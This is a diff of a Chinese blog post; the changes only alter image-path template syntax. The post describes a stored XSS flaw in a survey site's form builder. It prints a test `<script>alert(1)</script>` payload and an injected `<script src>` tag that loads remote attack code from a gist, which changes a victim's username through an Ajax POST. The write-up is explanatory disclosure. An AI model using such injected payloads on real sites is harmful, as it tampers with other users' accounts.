@@ -20,11 +20,11 @@ status: publish
 
 说实话现在同事或者朋友的网站，见了输入框就想试一把 Javascript 注入。这次有一个某数据调查网站，做的十分精巧，用起来也很不错。其中有一个页面，是用户可以自己创建一个表单。表单可以有很多种元素，包括单选、 多选、 单行文本、 多行文本、 数字、 日期、 下拉框等。大多数用户输入都是安全的，但是还是发现了用户自定义单选选项，这个的 Javascript 输入没有被转义。
 
-![在 input 中输入 Javascript]({{ site.static_url }}/images/2013/xss-javascript-code-inject.jpg)
+![在 input 中输入 Javascript]({{ Configr.site['static_url'] }}/images/2013/xss-javascript-code-inject.jpg)
 
 上图可以看到在用户自定义表单的单选项目时，在项目选项中输入了一个简单的 `<script>alert(1);</script>`
 
-![没有被转移的 Javascript]({{ site.static_url }}/images/2013/xss-unescaped-javascript.jpg)
+![没有被转移的 Javascript]({{ Configr.site['static_url'] }}/images/2013/xss-unescaped-javascript.jpg)
 
 保存后，打开这个编辑页面，都可以看到这个没有被转移的 Javascript 被执行了。
 
@@ -49,7 +49,7 @@ status: publish
 
 由于该表单选项有字符数限制，只能将这段代码托管到别的地方，又是 [github](https://github.com/) 上： [https://gist.github.com/4681574](https://gist.github.com/4681574)。获取其 raw 文件 url 为：https://gist.github.com/raw/4681574.js。
 
-![攻击的 Javascript]({{ site.static_url }}/images/2013/xss-attack-code.jpg)
+![攻击的 Javascript]({{ Configr.site['static_url'] }}/images/2013/xss-attack-code.jpg)
 
 在表单上注入 `<script src='https://gist.github.com/raw/4681574.js'>`。
 
@@ -57,11 +57,11 @@ status: publish
 
 先试一个，将该表单共享给某个好友，当该好友打开其编辑页面时：
 
-![Ajax 的 Post 请求]({{ site.static_url }}/images/2013/xss-ajax-post.jpg)
+![Ajax 的 Post 请求]({{ Configr.site['static_url'] }}/images/2013/xss-ajax-post.jpg)
 
 注入的 Javascript 会发送一个 Ajax Post 请求，这个请求就会将被攻击用户的用户名修改了。
 
-![被恶意修改了的用户名]({{ site.static_url }}/images/2013/xss-modified-user-nick-name.jpg)
+![被恶意修改了的用户名]({{ Configr.site['static_url'] }}/images/2013/xss-modified-user-nick-name.jpg)
 
 看上图的右上角，被攻击用户的用户名已经被注入的 Javascript 恶意修改了。
 
